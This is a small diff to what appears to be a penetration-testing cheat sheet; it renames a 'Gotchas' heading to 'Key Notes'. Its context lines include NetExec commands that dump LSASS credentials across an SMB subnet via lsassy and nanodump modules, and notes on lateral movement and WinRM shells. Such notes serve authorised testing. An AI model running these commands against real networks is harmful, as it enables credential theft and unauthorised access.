@@ -278,7 +278,7 @@ nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M lsassy
 nxc smb <TARGET_SUBNET> -u <USER> -p '<PASS>' -M nanodump
 ```
 
-## Gotchas
+## Key Notes
 
 - Local admin on one box often leads to more hashes and more lateral paths.
 - WinRM shell is clean and comfortable when enabled.
